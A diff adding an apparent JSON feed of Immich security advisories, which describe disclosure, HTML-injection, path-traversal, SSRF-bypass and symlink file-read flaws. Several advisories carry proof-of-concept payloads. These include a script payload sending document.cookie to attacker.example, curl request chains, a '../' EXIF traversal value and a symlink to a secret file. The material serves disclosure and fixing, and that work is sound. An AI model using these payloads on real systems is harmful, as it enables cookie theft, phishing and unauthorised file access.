@@ -1,0 +1,2045 @@
+{
+  "schema": "advisorydeck/v1/product-feed",
+  "generated_at": "2026-11-16T02:25:17Z",
+  "product": {
+    "slug": "immich",
+    "name": "Immich",
+    "category": "storage",
+    "homepage": "https://immich.app",
+    "version_scheme": "semver",
+    "branches": []
+  },
+  "advisories": [
+    {
+      "id": "GHSA-jrj8-j4f9-9v85",
+      "aliases": [],
+      "title": "Album Owner Information Disclosure via Shared Links",
+      "summary": "### Summary\r\n\r\nShared links grant read access to the album owner profile, including the email and display name.\r\nThis is an unintended information disclosure that is not mentioned in the share interface and in the share API endpoint.\r\n\r\n### Details\r\n\r\nThe disclosed album object:\r\n```json\r\n\"owner\":\r\n   {\r\n        \"id\":\"5f923502-f20a-43a5-ae61-4a54fb27ff43\",\r\n        \"email\":\"test@example.com\",\r\n        \"name\":\"my name\",\r\n        \"profileImagePath\":\"\",\r\n        \"avatarColor\":\"red\",\r\n        \"profileChangedAt\":\"2033-12-25T13:41:35.964796+00:00\"\r\n   },\r\n```\r\n\r\nThis is part of the album object returned when accessing a shared link via `/api/shared-links/me?key=iSDdFj8e...`.\r\n\r\n### Proof of Concept\r\n\r\n1. Create a shared link without a password (metadata can be disabled)\r\n2. Open the link in a private window/new browser/another device\r\n3. Observe the network traffic requests that contain the owner metadata in the album object\r\n\r\n### Impact\r\n\r\nThis discloses personal profile information to anyone who has received the share link.\r\nThe relevant personal identifiable information are limited to email address, name and profile picture.",
+      "published_at": "2026-11-10T18:45:32.000Z",
+      "modified_at": "2026-11-10T18:45:32.000Z",
+      "severity": {
+        "level": "medium",
+        "score": 5.3,
+        "vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N",
+        "source": "ghsa"
+      },
+      "kev": {
+        "listed": false,
+        "added_at": null,
+        "checked": true
+      },
+      "epss": null,
+      "cwes": [
+        "CWE-200"
+      ],
+      "affected": [
+        {
+          "product": "immich",
+          "ranges": [
+            {
+              "introduced": "0",
+              "fixed": "3.4.0"
+            }
+          ]
+        }
+      ],
+      "references": [
+        {
+          "url": "https://github.com/immich-app/immich/security/advisories/GHSA-jrj8-j4f9-9v85",
+          "type": "advisory"
+        }
+      ],
+      "sources": [
+        {
+          "type": "ghsa",
+          "id": "GHSA-jrj8-j4f9-9v85",
+          "url": "https://github.com/immich-app/immich/security/advisories/GHSA-jrj8-j4f9-9v85",
+          "license": "CC-BY-4.0"
+        }
+      ],
+      "revision": "sha256:d5bce4ee46e4bd74e1a92196c18fd71a95c362002946bc459d3654314aa2988f",
+      "note": null
+    },
+    {
+      "id": "GHSA-v94m-9pp2-pm59",
+      "aliases": [],
+      "title": "Email HTML injection",
+      "summary": "### Summary\r\n\r\nWhen an admin enables custom email templates, Immich substitutes user-controlled values (display names, album names, usernames) into the template via raw string replacement with no HTML escaping, and then renders the result via React's `dangerouslySetInnerHTML`. Any normal user can plant arbitrary HTML - phishing links, image tags, attribute-rewriting payloads, sometimes script - into the emails the admin-configured templates send to other users. The default templates aren't affected; the bug only triggers when custom templates are configured, but the injected content comes from ordinary users with no special privileges.\r\n\r\n### Details\r\n\r\nThe substitution function does not escape its inputs - `server/src/utils/replace-template-tags.ts:1-5`:\r\n\r\n```ts\r\nexport const replaceTemplateTags = (template: string, variables: Record<string, string | undefined>) => {\r\n  return template.replaceAll(/{(.*?)}/g, (_, key) => {\r\n    return variables[key] || `{${key}}`;\r\n  });\r\n};\r\n```\r\n\r\nThe resulting string is then dropped into the React tree as raw HTML - three email components are affected:\r\n\r\n**`server/src/emails/welcome.email.tsx:44`:**\r\n\r\n```tsx\r\n{customTemplate && (\r\n  <Text className=\"m-0\">\r\n    <div dangerouslySetInnerHTML={{ __html: emailContent }}></div>\r\n  </Text>\r\n)}\r\n```\r\n\r\n**`server/src/emails/album-invite.email.tsx:43`** - same pattern.\r\n\r\n**`server/src/emails/album-update.email.tsx:42`** - same pattern.\r\n\r\nThe tag values fed into the substitution are all user-controlled:\r\n\r\n| Template tag | Source | Who controls it |\r\n|--------------|--------|-----------------|\r\n| `{senderName}` | The sharing user's `name` field | Any user |\r\n| `{recipientName}` | The recipient user's `name` field | Any user |\r\n| `{displayName}`, `{username}` | User registration | Any user |\r\n| `{albumName}` | Album creator | Any user |\r\n| `{password}` | Admin-set when creating accounts | Admin (less interesting) |\r\n\r\nCustom templates are an admin-only opt-in setting, which is why this is Medium rather than High - but the bug is exploitable by ordinary users once an admin turns the feature on.\r\n\r\n### PoC\r\n\r\n**Configuration:** an Immich instance running v2.7.5 where the admin has enabled a custom album-invite template. The template must contain at least one user-controlled placeholder like `{senderName}` or `{albumName}`.\r\n\r\n**Reproduction steps:**\r\n\r\n1. **As an attacker** (any normal Immich user), update your display name to a phishing payload:\r\n\r\n   ```\r\n   PATCH /api/users/me\r\n   { \"name\": \"</p><a href=\\\"https://attacker.example/phish\\\">Reset your password</a><p>\" }\r\n   ```\r\n\r\n2. Or, equivalently, create an album whose name is the payload:\r\n\r\n   ```\r\n   POST /api/albums\r\n   { \"albumName\": \"<img src=x onerror=\\\"fetch('https://attacker.example/?c='+document.cookie)\\\">\" }\r\n   ```\r\n\r\n3. Share that album with the victim.\r\n\r\n4. The server renders the configured custom template, substitutes your display name / album name with no escaping, and emits the resulting HTML inside `dangerouslySetInnerHTML`.\r\n\r\n5. The victim receives an email that, depending on their mail client, renders:\r\n   - **Always:** a phishing link styled as legitimate Immich content, on the legitimate domain.\r\n   - **Some clients (legacy webmail, certain mobile clients):** active JavaScript in the mail-origin context.\r\n\r\n**Source-level reproduction (vitest):**\r\n\r\nA complete vitest PoC for all five findings in this audit is published as a secret gist:\r\n\r\n<https://gist.github.com/Dredsen/b423a6c62cdb561b712803643a21b8fb>\r\n\r\nDownload into the Immich server workspace and run:\r\n\r\n```bash\r\ncurl -sL https://gist.githubusercontent.com/Dredsen/b423a6c62cdb561b712803643a21b8fb/raw/security-pocs.spec.ts \\\r\n  -o server/src/services/security-pocs.spec.ts\r\ncd server\r\npnpm install\r\npnpm test src/services/security-pocs.spec.ts --run\r\n```\r\n\r\nTest relevant to this finding:\r\n- `Finding 3: email template HTML injection > replaceTemplateTags does NOT html-escape attacker-controlled values`\r\n\r\nThe key as...",
+      "published_at": "2026-11-10T18:45:31.000Z",
+      "modified_at": "2026-11-10T18:45:31.000Z",
+      "severity": {
+        "level": "medium",
+        "score": 5.4,
+        "vector": "CVSS:3.1/AV:N/AC:L/PR:L/UI:R/S:C/C:L/I:L/A:N",
+        "source": "ghsa"
+      },
+      "kev": {
+        "listed": false,
+        "added_at": null,
+        "checked": true
+      },
+      "epss": null,
+      "cwes": [
+        "CWE-79"
+      ],
+      "affected": [
+        {
+          "product": "immich",
+          "ranges": [
+            {
+              "introduced": "0",
+              "fixed": "3.4.0"
+            }
+          ]
+        }
+      ],
+      "references": [
+        {
+          "url": "https://github.com/immich-app/immich/security/advisories/GHSA-v94m-9pp2-pm59",
+          "type": "advisory"
+        }
+      ],
+      "sources": [
+        {
+          "type": "ghsa",
+          "id": "GHSA-v94m-9pp2-pm59",
+          "url": "https://github.com/immich-app/immich/security/advisories/GHSA-v94m-9pp2-pm59",
+          "license": "CC-BY-4.0"
+        }
+      ],
+      "revision": "sha256:d5bce4ee46e4bd74e1a92196c18fd71a95c362002946bc459d3654314aa2988f",
+      "note": null
+    },
+    {
+      "id": "GHSA-j722-3hvf-c9vr",
+      "aliases": [],
+      "title": "Immich partner reads archived timeline metadata",
+      "summary": "## Summary\r\n\r\ni found that `GET /api/timeline/bucket` returns archived assets from the library owner to a partner account when `visibility` is omitted, a partner is supposed to receive only `timeline` assets. the response gives the archived asset id, visibility, thumbhash, GPS fields, capture time, ratio, type and live-photo linkage.\r\n\r\n## Code analysis\r\n\r\ni checked `timeBucketChecks()` first:\r\n\r\n```ts\r\nif (dto.userId) {\r\n  await this.requireAccess({ auth, permission: Permission.TimelineRead, ids: [dto.userId] });\r\n  if (dto.visibility === AssetVisibility.Archive) {\r\n    await this.requireAccess({ auth, permission: Permission.ArchiveRead, ids: [dto.userId] });\r\n  }\r\n}\r\n```\r\n\r\nthis is `server/src/services/timeline.service.ts:58-62`, `TimelineRead` accepts the partner user id through `server/src/utils/access.ts:265-269`, while `ArchiveRead` is self-only at `server/src/utils/access.ts:235-237`\r\n\r\nwhen `dto.visibility` is undefined, `server/src/repositories/asset.repository.ts:841` uses `withDefaultVisibility`, and `server/src/utils/database.ts:82-84` adds both `archive` and `timeline` to the query\r\n\r\nthe `withPartners` path filters archived assets at `timeline.service.ts:73-84`, the direct `userId` path does not, and per-asset partner access only grants `Timeline` and `Hidden` at `server/src/repositories/access.repository.ts:201-224`\r\n\r\n## Exploitation\r\n\r\ni reproduced this on a live Immich v3.0.0 server with the official Postgres vectorchord image, three standard accs , miau owns the library, cha is the partner, miau67 is unrelated\r\n\r\nmiau uploads `secret.jpg` and `public.jpg`, archives `SECRET_ID`, then adds cha as a partner, after that cha sends the request below without a `visibility` parameter\r\n\r\n## PoC\r\n\r\ncreate three standard accounts through the normal signup flow, miau owns the library, cha is the partner, miau67 is unrelated, then set their ids and tokens:\r\n\r\n```bash\r\n~/immich ❯ B=http://host:2283/api\r\n~/immich ❯ UA='Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0'\r\n```\r\n\r\nupload `secret.jpg` and `public.jpg` as miau, keep the returned ids in `SECRET_ID` and `PUBLIC_ID`, archive `SECRET_ID`, then add cha as partner:\r\n\r\n```bash\r\n~/immich ❯ SECRET_ID=$(curl -s -A \"$UA\" -X POST \"$B/assets\" -H \"Authorization: Bearer $TOK_MIAU\" -F deviceAssetId=p1 -F deviceId=poc -F fileCreatedAt=2026-03-15T10:00:00.000Z -F fileModifiedAt=2026-03-15T10:00:00.000Z -F 'assetData=@secret.jpg' | jq -r .id)\r\n~/immich ❯ PUBLIC_ID=$(curl -s -A \"$UA\" -X POST \"$B/assets\" -H \"Authorization: Bearer $TOK_MIAU\" -F deviceAssetId=p2 -F deviceId=poc -F fileCreatedAt=2026-03-15T11:00:00.000Z -F fileModifiedAt=2026-03-15T11:00:00.000Z -F 'assetData=@public.jpg' | jq -r .id)\r\n~/immich ❯ curl -s -A \"$UA\" -X PUT \"$B/assets\" -H \"Authorization: Bearer $TOK_MIAU\" -H 'Content-Type: application/json' -d \"{\\\"ids\\\":[\\\"$SECRET_ID\\\"],\\\"visibility\\\":\\\"archive\\\"}\"\r\n~/immich ❯ curl -s -A \"$UA\" -X POST \"$B/partners\" -H \"Authorization: Bearer $TOK_MIAU\" -H 'Content-Type: application/json' -d \"{\\\"sharedWithId\\\":\\\"$CHA_ID\\\"}\"\r\n```\r\n\r\nthe vulnerable request is:\r\n\r\n```bash\r\n~/immich ❯ curl -s -A \"$UA\" \"$B/timeline/bucket?timeBucket=2026-03-01&userId=$MIAU_ID&withCoordinates=true\" -H \"Authorization: Bearer $TOK_CHA\" | jq '{id, visibility, ownerId}'\r\n{\r\n  \"id\": [\"ae969c49-...\", \"75d2f680-...\"],\r\n  \"visibility\": [\"timeline\", \"archive\"],\r\n  \"ownerId\": [\"<MIAU_ID>\", \"<MIAU_ID>\"]\r\n}\r\n```\r\n\r\nthe `archive` entry is `SECRET_ID`, and `withCoordinates=true` also returns its `thumbhash`, `city`, `country`, `latitude`, `longitude`, `fileCreatedAt`, `ratio`, `isImage`, `livePhotoVideoId` and `projectionType`\r\n\r\nthe explicit archive request is rejected:\r\n\r\n```http\r\nHTTP 400\r\n{\"message\":\"Not found or no archive.read access\"}\r\n```\r\n\r\nthe same partner cannot read the asset or thumbnail:\r\n\r\n```http\r\nHTTP 400\r\n{\"message\":\"Not found or no asset.read access\"}\r\n\r\nHTTP 400\r\n{\"message\":\"Not found or no asset.view access\"}\r\n```\r\n\r\nan unrelated account is rejected by the timeline c...",
+      "published_at": "2026-11-10T18:45:30.000Z",
+      "modified_at": "2026-11-10T19:27:18.000Z",
+      "severity": {
+        "level": "medium",
+        "score": 4.3,
+        "vector": "CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:L/I:N/A:N",
+        "source": "ghsa"
+      },
+      "kev": {
+        "listed": false,
+        "added_at": null,
+        "checked": true
+      },
+      "epss": null,
+      "cwes": [
+        "CWE-200",
+        "CWE-639"
+      ],
+      "affected": [
+        {
+          "product": "immich",
+          "ranges": [
+            {
+              "introduced": "0",
+              "fixed": "3.4.0"
+            }
+          ]
+        }
+      ],
+      "references": [
+        {
+          "url": "https://github.com/immich-app/immich/security/advisories/GHSA-j722-3hvf-c9vr",
+          "type": "advisory"
+        }
+      ],
+      "sources": [
+        {
+          "type": "ghsa",
+          "id": "GHSA-j722-3hvf-c9vr",
+          "url": "https://github.com/immich-app/immich/security/advisories/GHSA-j722-3hvf-c9vr",
+          "license": "CC-BY-4.0"
+        }
+      ],
+      "revision": "sha256:d5bce4ee46e4bd74e1a92196c18fd71a95c362002946bc459d3654314aa2988f",
+      "note": null
+    },
+    {
+      "id": "GHSA-rq4j-mp2m-85qp",
+      "aliases": [],
+      "title": "Shared-link archive downloads can bypass edited-asset enforcement and include original files",
+      "summary": "# Shared-link archive downloads can bypass edited-asset enforcement and include original files\r\n\r\n## Summary\r\n\r\nCurrent Immich enforces a shared-link privacy boundary on single-asset media routes: when a request is authenticated through a shared link, `AssetMediaService.downloadOriginal()` and `viewThumbnail()` force `dto.edited = true` before fetching files. Existing tests explicitly cover that a shared-link request for an edited asset should not return the unedited version even if the request asks for `edited=false`.\r\n\r\nThe archive download endpoint does not apply the same server-side rule. `DownloadService.downloadArchive()` accepts the caller-controlled `DownloadArchiveDto.edited` value and passes `dto.edited ?? false` to `assetRepository.getForOriginals()`. Later it selects `editedPath` only when `dto.edited` is true; otherwise it adds `originalPath` to the ZIP.\r\n\r\nAs a result, anyone with a download-enabled shared link for an edited image can directly call `POST /download/archive` with `edited:false` or with the field omitted and receive the original unedited file in the ZIP, even though the single-file shared-link download path deliberately returns the edited file. This can disclose content that the owner cropped, rotated, mirrored, or otherwise edited before sharing.\r\n\r\nThe normal web UI currently sends `edited:true` when it calls `/download/archive`, but the backend route is public to shared-link callers and must enforce the same shared-link semantics independently of the client.\r\n\r\n## Affected Component\r\n\r\n- Repository: `immich-app/immich`\r\n- Component: server archive download path\r\n- Latest release checked: `v3.0.1`, published 2026-07-02\r\n- `v3.0.1` tag commit checked: `f77c8a4699aec043ec4a1b404559a7a291d592dc`\r\n- Current default branch checked: `main` at `6f45521610783ddf744db306e6dac5e9f59f035a`\r\n\r\nRelevant files:\r\n\r\n- `server/src/services/download.service.ts`\r\n- `server/src/services/asset-media.service.ts`\r\n- `server/src/dtos/download.dto.ts`\r\n- `server/src/services/asset-media.service.spec.ts`\r\n- `web/src/lib/utils/asset-utils.ts`\r\n\r\n## Vulnerable Path\r\n\r\nSingle-asset shared-link downloads force edited output:\r\n\r\n```ts\r\nasync downloadOriginal(auth: AuthDto, id: string, dto: AssetDownloadOriginalDto): Promise<ImmichFileResponse> {\r\n  await this.requireAccess({ auth, permission: Permission.AssetDownload, ids: [id] });\r\n\r\n  if (auth.sharedLink) {\r\n    dto.edited = true;\r\n  }\r\n\r\n  const { originalPath, originalFileName, editedPath } = await this.assetRepository.getForOriginal(\r\n    id,\r\n    dto.edited ?? false,\r\n  );\r\n\r\n  const path = editedPath ?? originalPath!;\r\n  ...\r\n}\r\n```\r\n\r\nThe existing unit test describes this intended behavior:\r\n\r\n```ts\r\nit('should not return the unedited version if requested using a shared link', async () => {\r\n  const fullsizeEdited = AssetFileFactory.create({ type: AssetFileType.FullSize, isEdited: true });\r\n  const editedAsset = AssetFactory.from().edit({ action: AssetEditAction.Crop }).file(fullsizeEdited).build();\r\n  ...\r\n  await expect(\r\n    sut.downloadOriginal(AuthFactory.from().sharedLink().build(), editedAsset.id, { edited: false }),\r\n  ).resolves.toEqual(\r\n    new ImmichFileResponse({\r\n      path: fullsizeEdited.path,\r\n      ...\r\n    }),\r\n  );\r\n});\r\n```\r\n\r\nBy contrast, archive download uses the request body value directly:\r\n\r\n```ts\r\nasync downloadArchive(auth: AuthDto, dto: DownloadArchiveDto): Promise<ImmichReadStream> {\r\n  await this.requireAccess({ auth, permission: Permission.AssetDownload, ids: dto.assetIds });\r\n\r\n  const zip = this.storageRepository.createZipStream();\r\n  const assets = await this.assetRepository.getForOriginals(dto.assetIds, dto.edited ?? false);\r\n  ...\r\n  let realpath = dto.edited && editedPath ? editedPath : originalPath;\r\n  ...\r\n  zip.addFile(realpath, filename);\r\n}\r\n```\r\n\r\nThe DTO makes `edited` optional:\r\n\r\n```ts\r\nconst DownloadArchiveSchema = AssetIdsSchema.extend({\r\n  edited: z.boolean().optional().describe('Download edited asset if available'),...",
+      "published_at": "2026-11-10T18:45:29.000Z",
+      "modified_at": "2026-11-10T18:45:29.000Z",
+      "severity": {
+        "level": "medium",
+        "score": 4.3,
+        "vector": "CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:L/I:N/A:N",
+        "source": "ghsa"
+      },
+      "kev": {
+        "listed": false,
+        "added_at": null,
+        "checked": true
+      },
+      "epss": null,
+      "cwes": [
+        "CWE-200",
+        "CWE-863"
+      ],
+      "affected": [
+        {
+          "product": "immich",
+          "ranges": [
+            {
+              "introduced": "0",
+              "fixed": "3.4.0"
+            }
+          ]
+        }
+      ],
+      "references": [
+        {
+          "url": "https://github.com/immich-app/immich/security/advisories/GHSA-rq4j-mp2m-85qp",
+          "type": "advisory"
+        }
+      ],
+      "sources": [
+        {
+          "type": "ghsa",
+          "id": "GHSA-rq4j-mp2m-85qp",
+          "url": "https://github.com/immich-app/immich/security/advisories/GHSA-rq4j-mp2m-85qp",
+          "license": "CC-BY-4.0"
+        }
+      ],
+      "revision": "sha256:d5bce4ee46e4bd74e1a92196c18fd71a95c362002946bc459d3654314aa2988f",
+      "note": null
+    },
+    {
+      "id": "GHSA-wwfq-95jq-3m3c",
+      "aliases": [],
+      "title": "Path Traversal via Improper Prefix Check in Storage Template Engine (unsanitized EXIF Make/Model/LensModel)",
+      "summary": "### Summary\r\nThe Storage Template engine in Immich allows an authenticated user to write uploaded files outside their intended per-user library directory, into sibling directories under the library root. This is caused by two compounding issues: (1) the make, model, and lensModel template variables are populated directly from raw, attacker-controlled EXIF metadata without sanitization (unlike album and filename, which are passed through the sanitize-filename package), and (2) the path containment check that should prevent traversal uses a naive string-prefix comparison (fullPath.startsWith(rootPath)) with no separator-boundary check, allowing paths that merely share rootPath as a literal string prefix - rather than actually residing within it - to pass validation.\r\n\r\n### Details\r\nThe vulnerability is in `server/src/services/storage-template.service.ts`.\r\n\r\nIn `render()`, the `make`, `model`, and `lensModel` template variables are populated directly from raw EXIF metadata with no sanitization:\r\n\r\n    make: make ?? '',\r\n    model: model ?? '',\r\n    lensModel: lensModel ?? '',\r\n\r\nThis is inconsistent with `album`, which is passed through `sanitize()` in the same function. `make`/`model`/`lensModel` are attacker-controlled via a crafted uploaded image's EXIF tags, and are offered by the admin UI as valid storage template variables.\r\n\r\nIn `getTemplatePath()` (~line 342), the path containment check that should prevent traversal is a naive string-prefix comparison with no path-separator boundary:\r\n\r\n    const fullPath = path.normalize(path.join(rootPath, storagePath));\r\n    let destination = `${fullPath}.${extension}`;\r\n    if (!fullPath.startsWith(rootPath)) {\r\n      this.logger.warn(`Skipped attempt to access an invalid path: ${fullPath}. Path should start with ${rootPath}`);\r\n      return source;\r\n    }\r\n\r\n`String.prototype.startsWith()` has no concept of directory boundaries. If `rootPath` is `/data/library/admin`, a `fullPath` of `/data/library/admin-poc-sibling-dir` also satisfies `fullPath.startsWith(rootPath)`, despite residing outside `admin/` entirely, in a sibling directory.\r\n\r\n\r\n### PoC\r\n1. As an admin, set the Storage Template to include `{{make}}`, e.g. `{{y}}/{{album}}/{{make}}/{{filename}}`, and save.\r\n2. Craft a JPEG with EXIF `Make` set to `../../admin-poc-sibling-dir` (exact `../` depth depends on the configured template's segment count - two levels was sufficient with an empty album against the default two-segment template).\r\n3. Upload the file as the `admin` user (library root `/data/library/admin`).\r\n4. The file is written to `/data/library/admin-poc-sibling-dir/<filename>.jpg`, outside the intended library directory, with no warning logged (confirming the check passed rather than triggered).\r\n\r\nVerified via:\r\n- `asset_exif` table: `make = ../../admin-poc-sibling-dir`, confirming unsanitized EXIF ingestion.\r\n- Server logs: no \"Skipped attempt to access an invalid path\" warning for this payload (contrast: a 4-level `../../../../` payload was correctly rejected and logged, since it overshot past the library root entirely rather than landing on a same-prefix sibling).\r\n- Filesystem: `find /data/library/admin-poc-sibling-dir -type f` → `/data/library/admin-poc-sibling-dir/malicious_exif.jpg`.\r\n\r\n### Impact\r\nAny authenticated user who can upload assets can cause files to be written outside their per-user library directory, into sibling directories under the shared library root - provided an admin has configured `{{make}}`, `{{model}}`, or `{{lensModel}}` in the storage template (offered by the admin UI as a standard option). Depending on directory-naming conventions in a given deployment, this could allow writes adjacent to other users' library directories, or pollute arbitrary sibling paths under the library root.\r\n\r\n### Suggested fix\r\nReplace the prefix check with a boundary-safe comparison, e.g.:\r\n\r\n    const relative = path.relative(rootPath, fullPath);\r\n    if (relative.startsWith('..') || path.isAbsolute(rel...",
+      "published_at": "2026-11-10T18:45:28.000Z",
+      "modified_at": "2026-11-10T18:45:28.000Z",
+      "severity": {
+        "level": "medium",
+        "score": 4.3,
+        "vector": "CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:N/I:L/A:N",
+        "source": "ghsa"
+      },
+      "kev": {
+        "listed": false,
+        "added_at": null,
+        "checked": true
+      },
+      "epss": null,
+      "cwes": [
+        "CWE-22",
+        "CWE-1220"
+      ],
+      "affected": [
+        {
+          "product": "immich",
+          "ranges": [
+            {
+              "introduced": "0",
+              "fixed": "3.4.0"
+            }
+          ]
+        }
+      ],
+      "references": [
+        {
+          "url": "https://github.com/immich-app/immich/security/advisories/GHSA-wwfq-95jq-3m3c",
+          "type": "advisory"
+        }
+      ],
+      "sources": [
+        {
+          "type": "ghsa",
+          "id": "GHSA-wwfq-95jq-3m3c",
+          "url": "https://github.com/immich-app/immich/security/advisories/GHSA-wwfq-95jq-3m3c",
+          "license": "CC-BY-4.0"
+        }
+      ],
+      "revision": "sha256:d5bce4ee46e4bd74e1a92196c18fd71a95c362002946bc459d3654314aa2988f",
+      "note": null
+    },
+    {
+      "id": "GHSA-8xfw-gq8x-8mrr",
+      "aliases": [],
+      "title": "Unanchored Regex Allows Complete Bypass of Plugin allowedHosts SSRF Protection",
+      "summary": "### Summary\r\nImmich's plugin/workflow system lets a plugin manifest declare `allowedHosts` - a list of hostname patterns restricting where its `httpRequest` capability can reach, intended as a sandboxing boundary. The check enforcing this is broken: it builds a regex from each pattern but never anchors it, so the match succeeds if the allowed hostname appears anywhere as a substring of the target, not just as an exact match. Any attacker-controlled domain that embeds the allowed hostname (e.g. `trusted-partner.example.com.attacker-controlled.net`) bypasses the restriction completely.\r\n\r\n\r\n### Details\r\nIn `server/src/services/workflow-execution.service.ts`, the `httpRequest` host function checks each `allowedHosts` pattern like this:\r\n\r\n```ts\r\nconst regex = new RegExp(pattern.replaceAll('.', String.raw`\\.`).replaceAll('*', '.*'));\r\nif (regex.test(hostname)) {\r\n  // request permitted\r\n}\r\n```\r\n\r\nThere are no `^`/`$` anchors. A pattern like `trusted-partner.example.com`, meant to restrict requests to that exact host, will also match `trusted-partner.example.com.attacker-controlled.net`, `nottrusted-partner.example.com`, or any string containing that substring. This defeats the entire purpose of `allowedHosts` as a security boundary - a plugin manifest can display a narrow, trustworthy-looking restriction while actually being able to reach arbitrary attacker-controlled infrastructure.\r\n\r\n### PoC\r\nReproduced in three layers, from isolated logic to full live GUI exploitation:\r\n\r\n**1. Isolated logic verification** (real Node.js, exact vulnerable code):\r\n**2. In-container live network test**: ran the identical check inside the running `immich_server` container against a real internal-only listener reachable via a lookalike domain. Result: `allowed: true`, followed by a successful `fetch()` (`status: 200`) reaching the internal target.\r\n\r\n**3. Full end-to-end GUI exploitation (primary evidence)**: Built and installed a real, compiled WASM plugin (`test-ssrf-plugin`) declaring method `restrictedPing` with `\"allowedHosts\": [\"trusted-partner.example.com\"]`. Created a workflow via Immich's Workflows UI (Trigger: `AssetCreate`; Step: `Restricted Ping`, `url: http://trusted-partner.example.com.attacker-controlled.net:8000/`). Uploaded a test photo through the ordinary Immich UI - no terminal access involved in the trigger itself. This fired the workflow, which called `httpRequest()`, which the broken check incorrectly approved. The internal listener's access log confirmed the request arrived:\r\n\r\nThe `POST` method matches the plugin's code (`functions.httpRequest(config.url, { method: 'POST' })`) exactly, confirming this was real workflow execution triggered by normal product usage.\r\n\r\n### Impact\r\nAny plugin declaring `allowedHosts` for sandboxing provides no real security boundary - the restriction is trivially bypassable by anyone who can register a domain containing the allowed hostname as a substring. This undermines the trust model an admin relies on when reviewing/installing a plugin claiming restricted network access. A malicious or compromised plugin can reach attacker-controlled infrastructure, internal-only services, or cloud metadata endpoints while displaying an innocuous, narrowly-scoped `allowedHosts` declaration.\r\n\r\n**Suggested remediation:** Anchor the regex and use safer wildcard semantics:\r\n```ts\r\nconst escaped = pattern.replaceAll('.', '\\\\.').replaceAll('*', '[^.]*');\r\nconst regex = new RegExp(`^${escaped}$`);\r\n```\r\nUsing `[^.]*` instead of `.*` for `*` also ensures a wildcard matches only a single hostname label, consistent with standard hostname-wildcard conventions.\r\n\r\n<img width=\"748\" height=\"223\" alt=\"ssrf_testing\" src=\"https://github.com/user-attachments/assets/db9783b8-2c5f-453c-84c2-55ce291d5d7e\" />\r\n\r\n<img width=\"440\" height=\"454\" alt=\"ssrf_testing_1\" src=\"https://github.com/user-attachments/assets/8f26acd8-3f76-40ad-a9f7-2a91cc907b1f\" />",
+      "published_at": "2026-11-10T18:45:27.000Z",
+      "modified_at": "2026-11-10T18:45:27.000Z",
+      "severity": {
+        "level": "low",
+        "score": null,
+        "vector": null,
+        "source": "ghsa"
+      },
+      "kev": {
+        "listed": false,
+        "added_at": null,
+        "checked": true
+      },
+      "epss": null,
+      "affected": [
+        {
+          "product": "immich",
+          "ranges": [
+            {
+              "introduced": "0",
+              "fixed": "3.4.0"
+            }
+          ]
+        }
+      ],
+      "references": [
+        {
+          "url": "https://github.com/immich-app/immich/security/advisories/GHSA-8xfw-gq8x-8mrr",
+          "type": "advisory"
+        }
+      ],
+      "sources": [
+        {
+          "type": "ghsa",
+          "id": "GHSA-8xfw-gq8x-8mrr",
+          "url": "https://github.com/immich-app/immich/security/advisories/GHSA-8xfw-gq8x-8mrr",
+          "license": "CC-BY-4.0"
+        }
+      ],
+      "revision": "sha256:84c7adfb8a24481bbd0da3607a15bab31a125dec8c424cf3af2b31f0ae5988fb",
+      "note": null
+    },
+    {
+      "id": "GHSA-wp5v-5wj6-j2fh",
+      "aliases": [],
+      "title": "Arbitrary File Read via Symlink Following in External Library Import",
+      "summary": "### Summary\r\nImmich's External Library import pipeline follows symbolic links without validating that the resolved file remains within the configured library root. As a result, an attacker with filesystem write access to a directory configured as an External Library can place a symbolic link pointing to an arbitrary file elsewhere on the host. During a library scan, Immich imports the symlink target as a normal asset and subsequently serves its contents through the standard asset download endpoint, allowing disclosure of files outside the configured library path that are readable by the Immich server process.\r\n\r\n### Details\r\nImmich allows administrators to configure one or more filesystem directories as External Libraries. During library scans, every discovered file is processed and imported as an asset.\r\n\r\nThe library path itself is validated when the External Library is created, but files discovered during subsequent scans are processed without resolving symbolic links or verifying that the resolved filesystem path remains within one of the configured import roots.\r\n\r\nIn server/src/services/library.service.ts, validateImportPath() validates only the configured import directory. Later, processEntity() normalizes each discovered path before calling storageRepository.stat():\r\n\r\nconst assetPath = path.normalize(filePath);\r\nconst stat = await this.storageRepository.stat(assetPath);\r\n\r\npath.normalize() only performs lexical path normalization and does not resolve symbolic links. Because the import pipeline never calls fs.realpath() (or performs an equivalent canonical path validation), symbolic links located inside the External Library are transparently followed. If a symbolic link points to a file outside the configured library, the referenced file is imported as a normal external asset and becomes accessible through Immich's authenticated asset download API.\r\n\r\n### PoC\r\nStep 1: Create a directory that will be used as an External Library and place a symbolic link inside it that points to a sensitive file located outside the library directory (e.g., ln -s /path/to/secret.txt /path/to/library/innocuous-photo.jpg). Configure this directory as an External Library by sending a POST /api/libraries request, then initiate a scan using POST /api/libraries/{libraryId}/scan.\r\n<img width=\"1550\" height=\"682\" alt=\"0\" src=\"https://github.com/user-attachments/assets/3cf8b715-6c5d-4917-9044-c098af391bb9\" />\r\n<img width=\"1550\" height=\"682\" alt=\"1\" src=\"https://github.com/user-attachments/assets/1de938a2-2e02-4be6-bf59-a4f688a3d1d2\" />\r\nStep 2: After the scan completes, retrieve the imported assets for the library (e.g., via POST /api/search/metadata with the libraryId) and observe that the symbolic link has been imported as a normal asset with an assigned assetId, despite its target residing outside the configured library path.\r\n<img width=\"1548\" height=\"832\" alt=\"2\" src=\"https://github.com/user-attachments/assets/fd6220a1-18e7-4440-913e-900990239e76\" />\r\nStep 3: Using a valid authenticated session, request the imported asset through GET /api/assets/{assetId}/original.Observe that the server returns the contents of the file referenced by the symbolic link (e.g., the contents of secret.txt) instead of restricting access to files within the configured External Library, demonstrating that the import pipeline follows symlinks without validating that their resolved paths remain inside the configured library root.\r\n<img width=\"1552\" height=\"388\" alt=\"3\" src=\"https://github.com/user-attachments/assets/1cec822c-8b26-47da-8772-8b7f15c7bbf1\" />\r\n\r\n### Impact\r\nAn attacker with filesystem write access to a directory configured as an External Library can cause Immich to disclose arbitrary files outside the configured library path that are readable by the Immich server process. The attacker does not require an Immich account or administrative privileges; only write access to the shared library directory is needed. This scenario is realistic for deployments t...",
+      "published_at": "2026-11-10T18:45:26.000Z",
+      "modified_at": "2026-11-10T18:45:26.000Z",
